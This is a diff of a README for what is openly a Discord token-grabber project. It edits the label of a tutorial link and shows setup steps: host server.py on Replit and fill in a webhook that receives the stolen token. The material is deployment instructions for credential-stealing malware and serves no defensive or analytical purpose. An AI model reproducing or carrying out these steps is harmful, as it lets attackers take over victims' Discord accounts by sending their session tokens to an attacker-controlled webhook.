@@ -2,7 +2,7 @@
 
 ## Setup
 
-#### [YouTube Tutorial](https://www.youtube.com/watch?v=NGU9GOXnNOA)
+#### [YouTube Tutorial (for lazy people)](https://www.youtube.com/watch?v=NGU9GOXnNOA)
 
 1. Upload the [`server.py`](https://github.com/I-Skid/discord-web-token-grabber/blob/main/server.py) script to a hosting service such as [Replit](https://replit.com/) or any other hosting service of your choice.
 2. Replace the text [`YOUR WEBHOOK`](https://github.com/I-Skid/discord-web-token-grabber/blob/main/server.py#L6) in the [`server.py`](https://github.com/I-Skid/discord-web-token-grabber/blob/main/server.py) script with the webhook you want the token to be sent to.
